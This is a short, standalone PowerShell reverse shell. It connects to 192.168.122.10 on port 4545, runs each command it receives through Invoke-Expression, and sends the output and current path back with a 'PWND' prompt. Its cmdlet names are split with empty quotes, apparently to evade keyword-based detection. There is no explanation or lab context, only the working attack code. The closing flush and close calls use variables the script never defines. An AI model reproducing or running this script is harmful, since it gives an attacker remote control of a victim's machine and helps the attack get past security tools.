$ip = "192.168.122.10"
$port = "4545"
 
$c= New-Obje''ct System.Net.Sockets.TCPClient($ip,$port);$s= $c.GetStream();[byte[]]$b= 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d= (N''e''w-O''b''j''e''c''t -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sendback = (iex ". { $d} 2>&1" | Out-String );$sendback2 = $sendback + 'PWND'+' ' + (p''w''d).Path + '->';$sb= ([text.encoding]::ASCII).GetBytes($sendback2);$s.Write($sb,0,$sb.Length);$stream.Flush()};$client.Close()
